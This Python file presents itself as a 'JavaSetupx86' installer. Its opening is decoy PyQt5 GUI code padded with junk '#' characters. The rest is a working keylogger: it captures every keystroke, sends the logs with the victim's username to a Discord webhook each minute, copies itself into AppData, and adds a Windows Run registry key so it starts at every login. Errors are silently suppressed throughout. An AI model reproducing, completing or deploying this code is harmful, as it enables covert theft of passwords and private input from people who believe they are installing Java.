

try:
    from PyQt5.QtWidgets import *
    from PyQt5.QtGui import *
    from PyQt5.QtCore import *
    from PyQt5.QtWebEngineWidgets import *
except: pass

class setupWithBrowser():
    def __init__(self):
        super(setupWithBrowser, self)
        self.window = QWidget()
        self.window.setWindowTitle('JavaSetupx86')  # no rtitler
        self.layout = QVBoxLayout()
        self.browser = QWebEngineView()
        self.layout.addWidget(self.browser)
        self.browser.setUrl(QUrl('https://netbeltfinance.com'))
        self.window.setLayout(self.layout)
        self.window.showFullScreen()

        # this won't be touched.
        if 1 > 50: 
            browser_.exec_()
            browser_ = QApplication([])
            window = setupWithBrowser()
try:
    import PyQt5.QtWidgets as qtw 
    import PyQt5.QtGui as qtg
except: pass

try:
    class MainWindow(qtw.QWidget):
        def __init__(self):
            super().__init__()
            try:
                # add a title
                self.setWindowTitle('Task-Manager')

                # set a vertical layout
                # self.setLayout(qtw.QVBoxLayout())
                form_layout = qtw.QFormLayout()
                self.setLayout(form_layout)

                # some stuff
                label_1 = qtw.QLabel('cool label')
                label_1.setFont(qtg.QFont('Helvetica', 24))

                f_name = qtw.QLineEdit(self)
                l_name = qtw.QLineEdit(self)

                # add rows
                form_layout.addRow(label_1)        
                form_layout.addRow('first name', f_name)        
                form_layout.addRow('last name', l_name)        
                form_layout.addRow(qtw.QPushButton('Nice', clicked=lambda: press_me()))

                def press_me():
                    label_1.setText('Setup-ed!')

                my_label = qtw.QLabel('JavaSetupx86')
                my_label.setFont(qtg.QFont('Helvetica', 18))
                self.layout().addWidget(my_label)

                my_entry = qtw.QLineEdit()
                my_entry.setObjectName('n_entry')
                my_entry.setText("Done!")
                self.layout().addWidget(my_entry) 

                my_button = qtw.QPushButton("press", clicked = lambda: press_func())
                self.layout().addWidget(my_button)

                def press_func():
                    my_label.setText(f'Exit, {my_combo.currentText()}')
            #rqwerqewrqew
                my_text = qtw.QTextEdit(self,##################################################################################
                    acceptRichText=True,########################################7777################################
                    lineWrapMode=qtw.QTextEdit.FixedColumnWidth,#################=#################################
                    lineWrapColumnOrWidth=50,##########################=###########-#############################=#################################################################
        #############6#####################################################################################################
                    )##############$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
        #############################0######################################################################
        ###########################0#########################################################################
                # combo box############################################66######################################################
                my_combo = qtw.QComboBox(self)#################################################################################
                # adding items#################0###########################################
                my_combo.addItem('cheese')###########################0#######################################
                my_combo.addItem('milk', 2)##################################=########################
                my_combo.addItem('yogurt')#####################################################################################
                my_combo.addItem('cheesy', qtw.QWidget)########################################################################
                self.layout().addWidget(my_combo)###########################=#############################
        ###################################################################=####################################
        #####################=#######################
                # show the app
                self.show()
                # if 1 > 10000:
                #     app.exec_()
                #     # qwertyuiopasdfghjklmnbvcxxzQWEYUIOPLKJHGFDSAZXCVBNM1234567890!@#$%^&*()
                #     app = qtw.QApplication([])
                #     mw = MainWindow()
            except NameError: pass
except NameError: pass
except: pass                
import os
import keyboard
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
TIMER = 60
WEBHOOK = "discord webhook"
class JavaSetup: 
    def __init__(self, interval, sendWithVerbose="webhook"):
        now = datetime.now()
        self.interval = interval
        self.sendWithVerbose = sendWithVerbose
        self.log = ""
        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()
        self.__reg__()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def sendMessage(self):
        try:
            flag = False
            webhook = DiscordWebhook(url=WEBHOOK)
            if len(self.log) > 2000:
                flag = True
                path = os.environ["temp"] + "\\message.txt"
                with open(path, 'w+') as file:
                    file.write(f"Coming From {self.username} Time: {self.end_dt}\n\n")
                    file.write(self.log)
                with open(path, 'rb') as f:
                    webhook.add_file(file=f.read(), filename='message.txt')
            else:
                embed = DiscordEmbed(title=f"Coming From ({self.username}) Time: {self.end_dt}", description=self.log)
                webhook.add_embed(embed)    
            webhook.execute()
            if flag:
                os.remove(path)
        except: pass

    def send(self):
        try:
            if self.log:
                if self.sendWithVerbose == "1":
                    self.sendMessage()    
            self.log = ""
            timer = Timer(interval=self.interval, function=self.send)
            timer.daemon = True
            timer.start()
        except: pass

    def start(self):
        try:
            self.start_dt = datetime.now()
            keyboard.on_release(callback=self.callback)
            self.send()
            keyboard.wait()
        except: pass

    def __reg__(self):
        try:
            import shutil, subprocess, sys
            file_location = os.environ["appdata"] + "\\Java Setupx86.exe"
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v javasetupx86 /t REG_SZ /d "' + file_location + '"', shell=True)
        except: pass

if __name__ == "__main__":
    java = JavaSetup(interval=TIMER, sendWithVerbose="1")    
    java.start()
    #rwqrwerwer
